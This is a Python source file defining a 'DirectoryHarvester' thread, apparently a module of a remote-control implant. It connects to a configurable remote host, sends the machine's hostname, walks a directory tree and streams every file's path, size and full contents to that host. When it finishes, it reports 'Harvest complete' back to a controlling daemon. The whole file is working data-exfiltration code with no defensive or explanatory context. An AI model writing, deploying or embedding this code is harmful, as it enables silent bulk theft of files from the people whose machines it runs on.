import os
from threading import Thread
import socket

class DirectoryHarvester(Thread):

	def __init__(self, dirname, daemon, target_host, target_port):
		Thread.__init__(self)
		self.dirname = dirname
		self.stayAlive = True
		self.isHarvestComplete = False;
		self.daemon = daemon
		self.target_host = target_host
		self.target_port = target_port

	def run(self):
		self.walkDir(self.dirname)

	def kill(self):
		self.stayAlive = False

	def isComplete(self):
		return self.isHarvestComplete

	def walkDir(self, dirname):
		#TODO: Add recovery
		remoteSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		remoteSocket.connect((self.target_host, self.target_port))
		hostname = socket.gethostname()
		hostnameLen = len(hostname)
		#print("Hostname: " + hostname + " " + str(hostnameLen))
		hostnameLenBytes = hostnameLen.to_bytes(4, 'big')
		remoteSocket.send(hostnameLenBytes)
		remoteSocket.send(hostname.encode('ascii'))
		for root, dirs, files in os.walk(dirname):
			for file in files:
				if self.stayAlive:
					absFilename = os.path.abspath(root + "//" + file)
					#print("Processing file: " + absFilename)
					absFilenameLen = len(absFilename)
					absFilenameBytes = absFilenameLen.to_bytes(4, 'big')
					remoteSocket.send(absFilenameBytes)
					remoteSocket.send(absFilename.encode('ascii'))
					fileSize = os.path.getsize(absFilename)
					fileSizeBytes = fileSize.to_bytes(8, 'big')
					remoteSocket.send(fileSizeBytes)
					with open(absFilename, 'rb') as f:
						while True and self.stayAlive:
							buf = f.read(1024)
							if buf: 
								remoteSocket.send(buf)#Note, I'm assuming that read(int) will return a partial if EOF is hit
								#Python docs are stupid and don't list edge case behavior.
							else:
								break
		endMsg = "End of transmission"
		endMsgLen = len(endMsg)
		endMsgLenBytes = endMsgLen.to_bytes(4, 'big')
		remoteSocket.send(endMsgLenBytes)
		remoteSocket.send(endMsg.encode('ascii'))
		self.isHarvestComplete = True
		self.daemon.postResponse("Harvest complete: " + dirname)